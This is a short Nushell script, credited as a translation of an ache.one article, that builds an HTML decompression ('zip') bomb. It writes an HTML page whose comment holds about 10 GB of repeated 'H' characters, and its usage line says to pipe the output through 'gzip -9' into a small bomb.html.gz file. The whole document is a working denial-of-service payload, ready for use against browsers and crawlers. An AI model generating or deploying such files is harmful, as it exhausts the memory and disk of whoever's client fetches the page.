#!/usr/bin/env nu

# made by: https://ache.one/notes/html_zip_bomb
# translated to Nu by me

def main [--i-use-gzip-now] {
    if not $i_use_gzip_now {
        print "DO NOT RUN THIS AS IS."
        print "usage: 'nu create-html-zip-bomb.nu | gzip -9 | save --raw --force bomb.html.gz'"
        print "Now run it with '--i-use-gzip-now'. I have not added it for you."
        return
    }
    
    # base HTML
    print --no-newline '<!DOCTYPE html><html lang=en><head><meta charset=utf-8><title>Projet: Valid HTML bomb</title><meta name=fediverse:creator content=@ache@mastodon.xyz><link rel=canonical href=https://ache.one/bomb.html><!--'
    
    let h = 1..258 | each { "H" } | str join "";
    
    # these numbers are chosen by ache.one
    # no idea if they're important
    
    1..(507 * 81925) | each { print --no-newline $h };
    1..81924 | each { print --no-newline $h };
    
    # End of HTML comment and body tag
    print --no-newline '--><body><p>This is a HTML valid bomb, cf. https://ache.one/articles/html_zip_bomb</p></body>';
}





